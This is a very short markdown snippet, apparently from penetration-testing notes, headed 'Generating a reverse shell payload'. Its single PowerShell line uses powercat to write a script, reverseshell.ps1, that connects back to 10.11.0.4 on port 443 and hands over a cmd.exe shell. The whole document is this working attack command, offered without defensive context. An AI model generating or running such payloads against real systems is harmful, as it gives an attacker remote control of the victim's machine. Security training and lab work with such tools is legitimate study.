# Generating a reverse shell payload
```ps
powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
```
